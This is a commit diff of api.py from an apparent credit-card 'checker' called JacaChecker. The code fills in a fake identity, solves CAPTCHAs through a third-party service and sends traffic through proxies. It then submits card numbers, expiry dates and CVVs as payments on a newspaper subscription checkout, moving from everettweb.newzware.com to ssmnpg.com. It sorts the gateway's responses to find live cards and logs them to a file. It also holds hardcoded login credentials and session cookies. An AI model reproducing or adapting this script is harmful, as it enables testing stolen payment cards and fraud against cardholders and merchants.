d119c52570bd829a15da016d9de333f224d666c6
jacagift2 <166268731+jacagift2@users.noreply.github.com>
2024-04-14 16:45:34 -0300

    Update api.py

--- api.py
+++ api.py
@@ -25,7 +25,7 @@ def criarTask():
         "task": {
             "type": "RecaptchaV2TaskProxyless",
             "websiteURL": "https://everettweb.newzware.com/ss70v2/sound/common/template.jsp",
-            "websiteKey": "6Lcb5mcaAAAAAOOmjTu_EvLbKXpFw8xBO-jDg0Sf",
+            "websiteKey": "6LeF47cUAAAAAMbDh0XxUukTdBNNF8xjOvWJ5Xtc",
         },
     }
     criar = requests.post(
@@ -96,8 +96,9 @@ def definir_tipo_cartao(card):
     
 def checker(card, month, year, cvv):
     
-    try:    
-        start_time = time.time()  
+    
+        
+    try:
         url = "https://randomuser.me/api?results=1&gender=&password=upper,lower,12&exc=register,picture,id&nat=US"
         headers = {
                 'Host': 'randomuser.me',
@@ -122,7 +123,7 @@ def checker(card, month, year, cvv):
         snumber = pegarItem(response.text, '"street":{"number":',',')
         city = pegarItem(response.text, '"city":"','"')
         state = pegarItem(response.text, '"state":"','"')
-        state = state[0:2]
+        state = state[0:2].upper()
         postcode = pegarItem(response.text, '"postcode":',',')
         company = pegarItem(response.text, '"username":"','"')
         tel = random.randint(1111,9999)
@@ -136,12 +137,36 @@ def checker(card, month, year, cvv):
             start_time = time.time() 
 
 
-            url = "https://everettweb.newzware.com/newzlib/jsp/ci/login_check_jso.jsp"
-
-            payload = "&site=sound&login_id=jacaccbot%40gmail.com&password=radask10&referrer=&masterL=&masterP=null"
+            url = "https://ssmnpg.com/ss70v2/npg/custom/npgstart.jsp?rateid=6071&site=npg&rpage=https://www.newspressnow.com/"
+            payload = {}
             headers = {
-                'Host': 'everettweb.newzware.com',
-                'Cookie': 'nwssmcookie=ssm; nwssmapptype=S',
+            'Host': 'ssmnpg.com',
+            'Cookie': 'JSESSIONID=3f0L1t-CxFpQSun8sZ8cDCDeYeRO81IM5zPbzMky.ssmngp.com; nwssmcookie=ssm',
+            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+            'sec-ch-ua-mobile': '?0',
+            'sec-ch-ua-platform': '"Windows"',
+            'upgrade-insecure-requests': '1',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+            'sec-fetch-site': 'cross-site',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-user': '?1',
+            'sec-fetch-dest': 'document',
+            'referer': 'https://www.newspressnow.com/',
+            'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
+            }
+
+            response = requests.request("GET", url, headers=headers, data=payload, verify=False, proxies=p)
+            sessao = response.cookies.get('JSESSIONID')
+
+
+
+
+            url = f"https://ssmnpg.com/newzlib/jsp/common/login_exists.jsp?site=npg&login_id={email}"
+            payload = "dataType=xml&type=POST"
+            headers = {
+                'Host': 'ssmnpg.com',
+                'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm',
                 'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
                 'accept': '*/*',
                 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
@@ -149,138 +174,162 @@ def checker(card, month, year, cvv):
                 'sec-ch-ua-mobile': '?0',
                 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
                 'sec-ch-ua-platform': '"Windows"',
-                'origin': 'https://everettweb.newzware.com',
+                'origin': 'https://ssmnpg.com',
                 'sec-fetch-site': 'same-origin',
                 'sec-fetch-mode': 'cors',
                 'sec-fetch-dest': 'empty',
-                'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
-                'accept-language': 'pt-PT,pt;q=0.9'
+                'referer': 'https://ssmnpg.com/ss70v2/npg/custom/npgstart.jsp?rateid=6071&site=npg&rpage=https://www.newspressnow.com/',
+                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7'
+                }
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
+            sessao = response.cookies.get('JSESSIONID')
+
+
+
+            url = "https://ssmnpg.com/newzlib/jsp/common/clean_address.jsp?site=npg&edition=NP&street=23937%20Rancho%20Ct&city=Valencia&state=CA&zip=91354&country=US&route=Y"
+            payload = "https://ssmnpg.com/newzlib/jsp/common/clean_address.jsp?site=npg&edition=NP&street=23937%20Rancho%20Ct&city=Valencia&state=CA&zip=91354&country=US&route=Y"
+            headers = {
+                'Host': 'ssmnpg.com',
+                'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm',
+                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+                'sec-ch-ua-mobile': '?0',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+                'sec-ch-ua-platform': '"Windows"',
+                'accept': '*/*',
+                'origin': 'https://ssmnpg.com',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-dest': 'empty',
+                'referer': 'https://ssmnpg.com/ss70v2/npg/custom/npgstart.jsp?rateid=6071&site=npg&rpage=https://www.newspressnow.com/',
+                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+                'Content-Type': 'text/plain'
+                }
+            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
+            sessao = response.cookies.get('JSESSIONID')
+
+
+
+            if len(year) == 4:
+                        year = year[2:]
+            url = "https://ssmnpg.com/newzlib/jsp/ci/calculate.jsp?site=npg&retail_rate=6071&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_zip=91354&d_state=CA&d_country=undefined&grat_amt=0.00&nie_amt=0&useZip=false"
+            payload = "https://ssmnpg.com/newzlib/jsp/ci/calculate.jsp?site=npg&retail_rate=6071&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_zip=91354&d_state=CA&d_country=undefined&grat_amt=0.00&nie_amt=0&useZip=false"
+            headers = {
+                'Host': 'ssmnpg.com',
+                'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm',
+                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+                'sec-ch-ua-mobile': '?0',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+                'sec-ch-ua-platform': '"Windows"',
+                'accept': '*/*',
+                'origin': 'https://ssmnpg.com',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-dest': 'empty',
+                'referer': 'https://ssmnpg.com/ss70v2/npg/custom/npgstart.jsp?rateid=6071&site=npg&rpage=https://www.newspressnow.com/',
+                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+                'Content-Type': 'text/plain'
                 }
 
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
-            sessao = response.headers.get('JSESSIONID')
-
-
-            url = "https://everettweb.newzware.com/ss70v2/common/login.jsp"
-
-            payload = "login_id=jacaccbot%40gmail.com&hash=c59dbf4b7a1fef9a88f2c98d9d805cab&site=sound&encrypted=Y&nwmodule=&nwpage=&rate_id=&remember=N&reverse_remember_me=N&nwregistered="
-            headers = {
-            'Host': 'everettweb.newzware.com',
-            'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm; nwssmapptype=S',
-            'cache-control': 'max-age=0',
-            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-            'sec-ch-ua-mobile': '?0',
-            'sec-ch-ua-platform': '"Windows"',
-            'upgrade-insecure-requests': '1',
-            'origin': 'https://everettweb.newzware.com',
-            'content-type': 'application/x-www-form-urlencoded',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'navigate',
-            'sec-fetch-user': '?1',
-            'sec-fetch-dest': 'document',
-            'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp',
-            'accept-language': 'pt-PT,pt;q=0.9'
-            }
-
-            response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
-            sessao = response.headers.get('JSESSIONID')
-
+            sessao = response.cookies.get('JSESSIONID')
             recap = criarTask()
 
-            url = f"https://everettweb.newzware.com/newzlib/jsp/ci/gift.jsp?site=sound&giftAccount=90411139&login_id=jacaccbot%40gmail.com&prefix=&fname=Clarkson&b_fname=Clarkson&lname=Pesres&b_lname=Pesres&suffix=&email=jacaccbot%40gmail.com&b_email=jacaccbot%40gmail.com&copies=1&h_phone=661-345-2222&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_state=CA&d_zip=91354&d_country=US&sameBilling=N&b_street=23937%20Rancho%20Ct&b_city=Valencia&b_state=CA&b_zip=91354&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=232&cc_exp_month={month}&cc_exp_year={year}&cc_holder=jame%20saks&acct_num=&acct_type=C&acct_receiving=&debit_day=10&retail_rate=7664&start_date=04/24/2024&recurring=N&tax_amt=0.00&net_amt=5.95&nie_amt=0&grat_amt=0&subtotal_amt=5.95&ju_id=0&noChargeOnGift=N&promo_code=&nwCapChallenge={recap}"
 
-            payload = f"https://everettweb.newzware.com/newzlib/jsp/ci/gift.jsp?site=sound&giftAccount=90411139&login_id=jacaccbot%40gmail.com&prefix=&fname=Clarkson&b_fname=Clarkson&lname=Pesres&b_lname=Pesres&suffix=&email=jacaccbot%40gmail.com&b_email=jacaccbot%40gmail.com&copies=1&h_phone=661-345-2222&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_state=CA&d_zip=91354&d_country=US&sameBilling=N&b_street=23937%20Rancho%20Ct&b_city=Valencia&b_state=CA&b_zip=91354&b_country=US&pay_method=C&cc_num={card}&cc_type=VISA&cc_cid=232&cc_exp_month={month}&cc_exp_year={year}&cc_holder=jame%20saks&acct_num=&acct_type=C&acct_receiving=&debit_day=10&retail_rate=7664&start_date=04/24/2024&recurring=N&tax_amt=0.00&net_amt=5.95&nie_amt=0&grat_amt=0&subtotal_amt=5.95&ju_id=0&noChargeOnGift=N&promo_code=&nwCapChallenge={recap}"
+
+            url = f"https://ssmnpg.com/newzlib/jsp/ci/new_start.jsp?site=npg&fname=james&lname=dean&b_fname=james&b_lname=dean&email={email}&copies=1&h_phone=661-214-7345&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_state=CA&d_zip=91354&d_country=US&firmline=&b_street=23937%20Rancho%20Ct&b_city=Valencia&b_state=CA&b_zip=91354&b_country=US&cc_num={card}&cc_type=VISA&cc_cid=232&cc_exp_date={month}%2F{year}&cc_holder=james%20dean&acct_num=&acct_type=Checking&acct_receiving=&debit_day=0&retail_rate=6071&pay_method=C&recurring=N&tax_amt=0.00&net_amt=10.00&gratuity=0.00&subtotal_amt=10.00&ju_id=0&route=SSMROUTE&promoCode=&login_id={email}&password=radask10&createOnlineAccount=Y&oneTimeForRecurring=Y&nwCapChallenge={recap}&isV2=Y"
+            payload = f"https://ssmnpg.com/newzlib/jsp/ci/new_start.jsp?site=npg&fname=james&lname=dean&b_fname=james&b_lname=dean&email={email}&copies=1&h_phone=661-214-7345&d_street=23937%20Rancho%20Ct&d_city=Valencia&d_state=CA&d_zip=91354&d_country=US&firmline=&b_street=23937%20Rancho%20Ct&b_city=Valencia&b_state=CA&b_zip=91354&b_country=US&cc_num={card}&cc_type=VISA&cc_cid=232&cc_exp_date={month}%2F{year}&cc_holder=james%20dean&acct_num=&acct_type=Checking&acct_receiving=&debit_day=0&retail_rate=6071&pay_method=C&recurring=N&tax_amt=0.00&net_amt=10.00&gratuity=0.00&subtotal_amt=10.00&ju_id=0&route=SSMROUTE&promoCode=&login_id={email}&password=radask10&createOnlineAccount=Y&oneTimeForRecurring=Y&nwCapChallenge={recap}&isV2=Y"
             headers = {
-            'Host': 'everettweb.newzware.com',
-            'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm; nwssmapptype=S',
-            'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
-            'sec-ch-ua-mobile': '?0',
-            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
-            'sec-ch-ua-platform': '"Windows"',
-            'accept': '*/*',
-            'origin': 'https://everettweb.newzware.com',
-            'sec-fetch-site': 'same-origin',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-dest': 'empty',
-            'referer': 'https://everettweb.newzware.com/ss70v2/sound/common/template.jsp?site=sound&nwmodule=subscribers&nwpage=gift&giftAccount=90411139&login_id=jacaccbot%40gmail.com&lname=PESRES',
-            'accept-language': 'pt-PT,pt;q=0.9',
-            'Content-Type': 'text/plain'
-            }
-
+                'Host': 'ssmnpg.com',
+                'Cookie': f'JSESSIONID={sessao}; nwssmcookie=ssm',
+                'sec-ch-ua': '"Google Chrome";v="123", "Not:A-Brand";v="8", "Chromium";v="123"',
+                'sec-ch-ua-mobile': '?0',
+                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36',
+                'sec-ch-ua-platform': '"Windows"',
+                'accept': '*/*',
+                'origin': 'https://ssmnpg.com',
+                'sec-fetch-site': 'same-origin',
+                'sec-fetch-mode': 'cors',
+                'sec-fetch-dest': 'empty',
+                'referer': 'https://ssmnpg.com/ss70v2/npg/custom/npgstart.jsp?rateid=6071&site=npg&rpage=https://www.newspressnow.com/',
+                'accept-language': 'pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
+                'Content-Type': 'text/plain'
+                }
             response = requests.request("POST", url, headers=headers, data=payload, verify=False, proxies=p)
             time.sleep(4)
                 
-                    
                     
 
             elapsed_time = time.time() - start_time
             
             MSegundos = round(elapsed_time, 2)
             
+
+
+
             if 'adress' in response.text:
                 bin = api_bin(card[:6])              
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: AVS [{MSegundos}] MS"                          
                 open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} avs  [{MSegundos}] #JacaChecker\n")
                 print(Fore.GREEN + f"{x} #JacaChecker")     
-                #return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
+                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"}
             
             elif 'Insufficient funds' in response.text:
                 bin = api_bin(card[:6])              
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: NSF [{MSegundos}] MS"                          
                 open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} NSF [{MSegundos}] #JacaChecker\n") 
                 print(Fore.GREEN + f"{x} #JacaChecker") 
-                #return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
+                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                 
             elif 'Unidentifiable error issuer generated' in response.text:
                 bin = api_bin(card[:6])              
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Retry 19 [{MSegundos}] MS"                          
                 open("everettweb.txt", "a").write(f"Live: {card} {month} {year} {cvv} {bin} Retry 19 [{MSegundos}] #JacaChecker\n") 
                 print(Fore.GREEN + f"{x} #JacaChecker") 
-                #return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
+                return {"code": 0, "mensagem": f"{x} #JacaChecker<br>"} 
                     
             elif 'expired' in response.text:  
                 bin = api_bin(card[:6])
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card Expired [{MSegundos}] MS"     
                 print(Fore.RED + f"{x} #JacaChecker")  
-                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}  
+                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}  
                                         
             elif 'The specified account was not found' in response.text:  
                 bin = api_bin(card[:6])
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Account Not Found [{MSegundos}] MS"     
                 print(Fore.RED + f"{x} #JacaChecker")  
-                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"} 
+                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"} 
                 
             elif 'The account number failed to pass the LUHN' in response.text:  
                 bin = api_bin(card[:6])
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Invalid Card [{MSegundos}] MS"     
                 print(Fore.RED + f"{x} #JacaChecker")  
-                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
+                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                 
             elif 'Do not honor' in response.text:  
                 bin = api_bin(card[:6])
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Do Not Honor [{MSegundos}] MS"     
                 print(Fore.RED + f"{x} #JacaChecker")  
-                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
+                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                 
             elif 'Issuer has flagged this account as fraudulent' in response.text:  
                 bin = api_bin(card[:6])
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Suspected Fraud [{MSegundos}] MS"     
                 print(Fore.RED + f"{x} #JacaChecker")  
-                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
+                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                 
             elif 'Card has been restricted' in response.text:  
                 bin = api_bin(card[:6])
                 x = f"{card}|{month}|{year}|{cvv}| {bin} - Status: Card has been restricted [{MSegundos}] MS"     
                 print(Fore.RED + f"{x} #JacaChecker")  
-                #return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
+                return {"code": 2, "mensagem": f"{x} #JacaChecker<br>"}
                 
             else:
                 
                 print(Fore.RED + 'Gateway Timeout' + response.text)
                 return {"code": 2, "mensagem": f"Gateway Timeout #JacaChecker<br>"}
                 
+                    
+
 
             
     except requests.exceptions.ProxyError:
@@ -307,8 +356,8 @@ def processar_cartoes(card,mes,ano,cvv):
         else:
             return {"code": "", "retorno": "erro no formulario"}
     except:
-        #retorno = checker(card,mes,ano,cvv)
-        return {"code": "", "retorno": "Exception"}
+        #retorno = reteste(card,mes,ano,cvv)
+        return {"code": "", "retorno": "Exception !"}
     
     
 
